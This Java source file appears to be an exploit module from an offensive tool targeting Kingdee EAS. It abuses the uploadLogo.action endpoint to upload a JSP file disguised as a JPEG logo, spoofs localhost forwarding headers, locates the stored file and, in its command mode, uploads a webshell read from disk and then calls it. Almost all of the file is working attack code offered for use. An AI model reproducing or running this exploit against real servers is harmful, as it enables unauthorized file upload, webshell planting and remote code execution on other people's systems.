package exp.oa.kingdeeoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class kingdee_EAS_uploadLogo_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String uploadLogo(String url,String filename,String content){
        HashMap head = new HashMap();
        head.put("X-Originating-IP","127.0.0.1");
        head.put("X-Forwarded-For","127.0.0.1");
        head.put("X-Remote-Addr","127.0.0.1");
        head.put("X-Remote-IP","127.0.0.1");
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String postData = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"chooseLanguage_top\"\r\n" +
                "\r\n" +
                "ch\r\n" +
                "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"dataCenter\"\r\n" +
                "\r\n" +
                "xx\r\n" +
                "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"insId\"  fragment-1641287796427\r\n" +
                "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"type\"\r\n" +
                "\r\n" +
                "top\r\n" +
                "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\""+filename+"\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                "R4g"+content+
                "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--";
        Response res = HttpTools.post(url+"/plt_portal/setting/uploadLogo.action",postData,head,"utf-8");
        if(res.getCode()==200 ){
            String var1 = res.getText();
            int var2 = getIndexOf.getLineNumber(var1,"gp.uploadLogoSuccess");
            String var3 = getIndexOf.getMessage_useLine(var1,var2,var2);
            String var4 = var3.substring(var3.indexOf("nullLogo")+11,var3.indexOf(".jsp\",")+4);
            Response res1 = HttpTools.get(url+"/portal/res/file/upload/"+var4,head,"utf-8");
            if(res1.getText().contains(content.substring(0,2))||res1.getText().contains("R4g")){
                return url+"/portal/res/file/upload/"+var4;
            }
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            String payload = "Hello R4g";
            String result = uploadLogo(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ kingdee_EAS_uploadLogo_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n ");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        try {
            String shell_payload = Methods.readFile(cmd);
            long tt = (new Date()).getTime();
            String filename = "R4g"+tt+".jsp";
            String payload = "R4g\n"+shell_payload;
            String result = uploadLogo(url,filename,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: \n"+result);
                    textArea_cmd.appendText("\n "+ get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
